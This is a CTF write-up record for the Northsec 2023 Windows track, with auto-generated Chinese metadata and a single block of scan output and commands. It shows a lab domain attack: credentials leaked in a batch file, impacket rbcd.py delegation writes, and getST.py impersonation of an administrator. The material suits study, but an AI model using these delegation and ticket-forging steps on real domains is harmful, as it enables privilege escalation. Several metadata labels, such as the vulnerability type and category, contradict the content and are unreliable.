---
title: Windows Track Northsec 2023 Writeup
contest: Northsec 2023 (Windows Track)
year: 2023
difficulty: hard
vuln_type: crypto_symmetric
tags:
- kerberos_delegation
- rbcd_py
- getst_py
- resource_based_constrained_delegation
- atm_net_use
- swiftmq_amqp_ssl
- amqp_5671
- ipv6_scan
- nfs_mount_packages
- swiftmq_rabbitmq
attack_chain: 'IPv6 扫描发现 www.bank.ctf + atm01.bank.ctf → net use z: \NFS01\atm\packages qb@ZWFVF2$1w$[*= /user:bank\ATMService (暴露 NFS 凭据) → copy z:\software C:\Packages → rot47 解密 u{pv\a_732_d57g36275ffh_3cbgde5fg`6hc → rbcd.py -action write -delegate-from ''webdev-old$'' -delegate-to ''ATM01$'' ''bank.ctf/ATMService:qb@ZWFVF2$1w$[*=1337'' → getST.py -spn ''cifs/atm01.bank.ctf'' -impersonate administrator → swiftmq 5671 SSL AMQP + pika SSLOptions 链'
key_payload: 'net use z: \NFS01\atm\packages qb@ZWFVF2$1w$[*= /user:bank\ATMService / rbcd.py -action write -delegate-from ''webdev-old$'' -delegate-to ''ATM01$'' ''bank.ctf/ATMService:qb@ZWFVF2$1w$[*=1337'' / getST.py -spn ''cifs/atm01.bank.ctf'' -impersonate administrator -dc-ip ... -dc-ip'
one_liner: Northsec 2023 Windows 域攻击链：IPv6 主机发现 + RunUpdate.bat net use 暴露 NFS 凭据 + rot47 解密 + rbcd RBCD 委派 + getST 伪造 cifs S4U2Self+Self 票据 + swiftmq AMQP SSL 通信。
lesson: RunUpdate.bat 类批处理日志直接暴露 net use 凭据是 Windows 域内网经典；rbcd.py + getST.py 是 impacket 域内 RBCD 委派攻击标配。
quality: high
full_path: Windows_Track_Northsec_2023_Writeup.full.md
meta_path: Windows_Track_Northsec_2023_Writeup.meta.md
images_removed: true
images_removed_count: 1
schema_version: v3.0.0-P0
summary: Windows Track Northsec 2023 Writeup。Northsec 2023 Windows 域攻击链：IPv6 主机发现 + RunUpdate.bat net use 暴露 NFS 凭据 + rot47 解密 + rbcd RBCD 委派 + getST 伪造 cifs S4U2Self+Self 票据 + swiftmq AMQP SSL 通信。。经验：RunUp...
category: web
subcategory: web_other
tools_used:
- C
- Python
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 1
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/123678.html
reasoning_chain:
- 触发点：IPv6 扫描发现 www.bank.ctf + atm01.bank.ctf → 假设：Windows 域主机发现
- '动作：net use z: \\\\NFS01\\atm\\packages qb@ZWFVF2$1w$[*= /user:bank\\ATMService → 假设：RunUpdate.bat 类批处理日志暴露 NFS 凭据'
- copy z:\\software C:\\Packages → 触发点：暴露 NFS 共享凭据
- rot47 解密 u{pv\\a_732_d57g36275ffh_3cbgde5fg`6hc → 假设：rot47 编码密码
- rbcd.py -action write -delegate-from 'webdev-old$' -delegate-to 'ATM01$' 'bank.ctf/ATMService:qb@ZWFVF2$1w$[*=1337' → 触发点：资源委派攻击
- getST.py -spn 'cifs/atm01.bank.ctf' -impersonate administrator → 假设：S4U2Self + S4U2Proxy 票据伪造
- swiftmq 5671 SSL AMQP + pika SSLOptions 链 → 假设：SSL AMQP 通信解 flag
- 观察：IPv6 主机发现 + RunUpdate.bat 凭据 + rot47 + rbcd + getST + AMQP SSL 六连击
- 假设：bank.ctf 域 + ATMService 用户 + NFS 共享 + RBCD 委派 完整 Windows 域攻击链
failed_attempts:
- 试图直接 nxc smb 爆破 ATMService → 失败：必须用 RunUpdate.bat 日志中的 net use 凭据
- 试图用 mimikatz → 失败：必须走 rbcd + getST 票据伪造路径
- swiftmq 试图 plaintext 5672 → 失败：实际是 SSL 5671 + pika SSLOptions
key_observations:
- RunUpdate.bat 类批处理日志直接暴露 net use 凭据是 Windows 域内网经典
- rbcd.py + getST.py 是 impacket 域内 RBCD 委派攻击标配
- rot47 是 ROT13 变种，覆盖 ASCII 33-126，比 ROT13 更宽
- swiftmq 5671 SSL AMQP + pika SSLOptions 是消息中间件 SSL 通信标配
- IPv6 主机发现是内网扫描新维度，比 IPv4 更隐蔽
prerequisites:
- Windows 域基础（账户 / 服务 / 票据）
- impacket 工具链（rbcd.py / getST.py / wmiexec.py）
- NFS 共享挂载 + 凭据获取
- SwiftMQ / AMQP 协议 + SSL/TLS
- IPv6 网络扫描与主机发现
---
# Windows Track Northsec 2023 Writeup

> 原文: https://www.ctfiot.com/123678.html
> ID: 123678


```
Nmap scan report for www.bank.ctf (9000:
c1f3:
fea4:
dec1:
216:
3eff:
fec1:
d440)
Host is up (0.0080s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT STATE SERVICE
80/tcp open http
Nmap scan report for atm01.bank.ctf (9000:
c1f3:
fea4:
dec1:
216:
3eff:
fe13:
ef28)
Host is up (0.018s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT STATE SERVICE
135/tcp open msrpc
445/tcp open microsoft-ds
5900/tcp open vnc
:
RunUpdate.bat

:: Mounts the update server and pulls in all code updates.
:: This task is critical to keep the ATM running. Do not disable.

net use z: \\NFS01\atm\packages qb@ZWFVF2$1w$[*= /user:
bank\ATMService
copy z:\software C:\Packages

net use * /delete

:: rot47
:: u{pv\a_732_d57g36275ffh_3cbgde5fg`6hc
rbcd.py -action write -delegate-from 'webdev-old$' -delegate-to 'ATM01$' 'bank.ctf/ATMService:qb@ZWFVF2$1w$[*=1337'`
getST.py -spn 'cifs/atm01.bank.ctf' -impersonate administrator -dc-ip 9000:
c1f3:
fea4:
dec1:
216:
3eff:
fea2:
3b2d 'bank.ctf/webdev-old$:
Emzmw^wimqRKy!bs#m5'`
Nmap scan report for 9000:
c1f3:
fea4:
dec1:
216:
3eff:
fe38:
1827
Host is up, received user-set (0.013s latency).
Scanned at 2023-05-21 23:20:26 CEST for 15s

PORT STATE SERVICE REASON VERSION
5671/tcp open ssl/amqp syn-ack Advanced Message Queue Protocol
|_amqp-info: ERROR: AMQP:
handshake connection closed unexpectedly while reading frame header
| ssl-cert: Subject: commonName=swiftmq.ctf
| Issuer: commonName=swift.ctf
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-04-04T16:59:44
| Not valid after: 2024-04-03T16:59:44
| MD5: 015ca8fb571aa123a2eeb589c44b2979
| SHA-1: e5192906ce40e5ab27bcec957f0ad3a3cccdc133
| -----BEGIN CERTIFICATE-----
| MIICsTCCAZkCFDWMaC2z1Rf7p4PDRJR7YlrIXypeMA0GCSqGSIb3DQEBCwUAMBQx
| EjAQBgNVBAMMCXN3aWZ0LmN0ZjAeFw0yMzA0MDQxNjU5NDRaFw0yNDA0MDMxNjU5
| NDRaMBYxFDASBgNVBAMMC3N3aWZ0bXEuY3RmMIIBIjANBgkqhkiG9w0BAQEFAAOC
| AQ8AMIIBCgKCAQEAhjBTDujgPahenSKZtPOj48feTihL2xOT8XgLPuuGHkcXyNYc
| OS/vuZrYVHL4rxWmKC6EHg+jiURKzzZ6cbwZFutgNfnM587u1vVAuofmibShE8AK
| k+3W9qxQNlpO46eD56Iu8tULLGOVbjHRSj07aiZMkUhs3WXHD41jTugLrkLjgV/I
| NytbIck+xdFWA266SqOU193dhYtmVaZyD9SMdMAuDh2Nj4qMWvCDt0wIqV+Bg5t3
| WX6vM08I79Gj5ojKsEm2nrdzlb8XrnGqedZ0BiyMfwhJXc4pIWfIpY3pXuTE956p
| OQiJuX1BkshcbUzksiOm6Dd3djWk3RBMYuYEJQIDAQABMA0GCSqGSIb3DQEBCwUA
| A4IBAQApSX7Vdt9+23p6sjf9osrN62NQ287sgf3LttQOowQFV9jfnr2+razeiAR8
| ZOQFHSQrYu5mJwkVnjkI/eoqnhgtIq0295UAYM7e0jDs/GMQ+vAPFdE2Ax1sbtaP
| GDYtOeBO20xEGmwiKYP8rcAshItG2J+C1ibouwvroo/uY0VeapptFFdV34IbQ66Z
| q2vfSucl8P9JLaAZ2imcucFcXoIteAUt9DCaj6tU+aHJ4l9GJk7UFfLakCr7E8R4
| fi6gAQ34hsex+GbR56bDK1xb4AB96MVwiO6xcZ0m8GlgoxFmPLowoAKx4zG3uMq7
| 49ydELaH82h07BD2hkVYc6PDyamp
|_-----END CERTIFICATE-----

Host script results:
| address-info:
| IPv6 EUI-64:
| MAC address:
| address: 00163e381827
|_ manuf: Xensource
import ssl
import pika
import logging

context = ssl.create_default_context(cafile="cert.pem")
context.verify_mode = ssl.CERT_REQUIRED
context.load_cert_chain("client-cert.pem","key.pem")
ssl_options = pika.SSLOptions(context, "swiftmq.ctf")
credentials = pika.credentials.ExternalCredentials()
conn_params = pika.ConnectionParameters(host="rabbitmq.bank.ctf",port=5671,ssl_options=ssl_options,credentials=credentials)

with pika.BlockingConnection(conn_params) as conn:
 ch = conn.channel()
```


---
## 附图

[图片已移除]